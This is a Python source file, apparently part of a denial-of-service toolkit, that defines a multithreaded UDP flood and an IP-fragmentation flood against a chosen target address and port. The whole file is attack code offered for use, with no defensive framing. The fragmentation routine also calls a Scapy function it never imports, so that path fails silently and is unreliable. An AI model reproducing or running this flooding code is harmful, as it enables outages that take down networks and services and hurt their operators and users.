import socket
import random
import time
import threading
from core.colors import log_info, log_success, log_warning, log_danger

class Layer4UDP:
    def __init__(self, target_ip, target_port=80, threads=100, time=300):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.time = time

    def udp_worker(self):
        end_time = time.time() + self.time
        # Create a raw UDP socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception:
            return

        # 65500 is max safe UDP payload before extreme fragmentation errors on client
        payload = random._urandom(1024) 

        while time.time() < end_time:
            try:
                # Randomize port if target_port is 0, else hit specific port
                port = self.target_port if self.target_port != 0 else random.randint(1, 65535)
                s.sendto(payload, (self.target_ip, port))
            except Exception:
                pass

    def fragment_worker(self):
        end_time = time.time() + self.time
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            return

        while time.time() < end_time:
            try:
                # Oversized fragmented UDP packet via Scapy
                from scapy.all import IP, UDP, raw
                ip_layer = IP(dst=self.target_ip, flags="MF", frag=0)
                udp_layer = UDP(sport=random.randint(1024, 65535), dport=self.target_port)
                packet = ip_layer / udp_layer / (b"X" * 1400)
                send(packet, verbose=False)
            except Exception:
                pass

    def run_method(self, method="UDP"):
        log_info(f"Starting RAW {method} Flood on {self.target_ip}:{self.target_port} with {self.threads} threads...")
        threads = []
        target_func = None
        
        if method == "UDP": target_func = self.udp_worker
        elif method == "FRAGMENT": target_func = self.fragment_worker
        
        if target_func:
            for _ in range(self.threads):
                t = threading.Thread(target=target_func)
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
            log_success(f"{method} Flood Finished.")
